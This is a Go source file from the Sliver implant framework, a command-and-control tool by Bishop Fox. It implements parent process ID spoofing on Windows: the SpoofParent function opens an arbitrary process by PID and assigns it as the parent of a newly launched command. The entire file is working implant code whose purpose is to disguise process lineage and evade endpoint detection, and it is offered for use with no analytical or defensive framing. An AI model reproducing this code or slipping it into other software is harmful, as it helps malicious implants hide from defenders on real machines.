//go:build windows

package spoof

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"os/exec"
	"syscall"

	"golang.org/x/sys/windows"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

func SpoofParent(ppid uint32, cmd *exec.Cmd) error {
	parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS|windows.PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION, false, ppid)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("OpenProcess failed: %v\n", err)
		//{{end}}
		return err
	}
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &windows.SysProcAttr{}
	}
	cmd.SysProcAttr.ParentProcess = syscall.Handle(parentHandle)
	return nil
}
